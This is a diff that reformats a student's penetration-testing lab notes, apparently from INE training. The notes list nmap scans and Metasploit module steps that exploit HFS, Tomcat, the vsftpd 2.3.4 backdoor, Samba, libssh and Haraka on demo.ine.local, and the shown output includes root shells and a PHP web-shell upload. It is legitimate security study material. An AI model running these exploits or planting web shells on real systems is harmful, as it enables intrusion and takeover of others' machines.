@@ -1,9 +1,8 @@
-Nmap : Importing Nmap Scan Results Into MSF
-Enumeration :  FTP Enumeration/Apahe Enumeration/MYSQL Enumeration/Postfix Recon: Basics(SMTP)
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-Windows Exploitation:
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-Windows: HTTP File Server
+## Nmap : Importing Nmap Scan Results Into MSF
+	Enumeration :  FTP Enumeration/Apahe Enumeration/MYSQL Enumeration/Postfix Recon: Basics(SMTP)
+
+# Windows Exploitation:
+## Windows: HTTP File Server
 	nmap -sV -sC demo.ine.local
 	80/tcp    open  http               HttpFileServer httpd 2.3
 	|_http-server-header: HFS 2.3
@@ -13,8 +12,7 @@ Windows: HTTP File Server
 		search hfs 
 		use exploit(windows/http/rejetto_hfs_exec
 		set RHOSTS demo.ine.local
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-Windows: Java Web Server
+## Windows: Java Web Server
 	=> Apache Tomcat is a Java web server
 
 	nmap -sV -sC demo.ine.local
@@ -27,11 +25,9 @@ Windows: Java Web Server
 	msfconsole -q
 	use exploit(multi/http/tomcat_jsp_upload_bypass)
 	set RHOSTS demo.ine.local
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-Linux Exploitation
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-Vnlnerable FTP Server
-=> VSFTPD (Very Secure FTP Daemon) 
+# Linux Exploitation
+## Vnlnerable FTP Server
+	=> VSFTPD (Very Secure FTP Daemon) 
 	nmap -sV -sC demo.ine.local
 	21/tcp open  ftp     vsftpd 2.3.4
 	|_ftp-anon: got code 500 "OOPS: cannot change directory:/nonexistent".
@@ -45,8 +41,7 @@ Vnlnerable FTP Server
 	[*] Command shell session 1 opened (192.108.87.2:38713 -> 192.108.87.3:6200) at 2025-01-15 20:35:59 +0530
 	whoami
 	root
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-Vulnerable File Sharing Service
+## Vulnerable File Sharing Service
 	nmap -sV -sC demo.ine.local
 	139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
 	445/tcp open  netbios-ssn Samba smbd 4.1.17 (workgroup: WORKGROUP)
@@ -67,9 +62,8 @@ Vulnerable File Sharing Service
 	id
 	uid=0(root) gid=0(root) groups=0(root)
 
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-Vnlnerable SSH server
-=> SSH (Secure Shell)
+## Vnlnerable SSH server
+	=> SSH (Secure Shell)
 	nmap -sV -sC demo.ine.local
 	22/tcp open  ssh     libssh 0.8.3 (protocol 2.0)
 
@@ -81,9 +75,8 @@ Vnlnerable SSH server
 	run
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	sessions -i 3
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-Vulnerable SMTP Server
-=> service postgresql start
+## Vulnerable SMTP Server
+	=> service postgresql start
 
 	nmap -sV -sC demo.ine.local
 	25/tcp open  smtp    Haraka smtpd 2.8.8
@@ -105,10 +98,8 @@ Vulnerable SMTP Server
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	meterpreter > sysinfo 
 
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-Post Exploitation Fundamentals
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-Meterpreter Basics
+# Post Exploitation Fundamentals
+## Meterpreter Basics
 	nmap -sV -sC demo.ine.local
 	80/tcp   open  http    Apache httpd 2.4.7 ((Ubuntu))
 	3306/tcp open  mysql   MySQL 5.5.47-0ubuntu0.14.04.1
@@ -181,8 +172,7 @@ Meterpreter Basics
 	meterpreter > upload /usr/share/webshells/php/php-backdoor.php
 	[*] Completed  : /usr/share/webshells/php/php-backdoor.php -> php-backdoor.php
 
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-Upgrading Command Shells To Meterpreter Shells
+## Upgrading Command Shells To Meterpreter Shells
 	nmap -sV demo.ine.local
 	msfconsole -q
 	use exploit/linux/samba/is_known_pipename
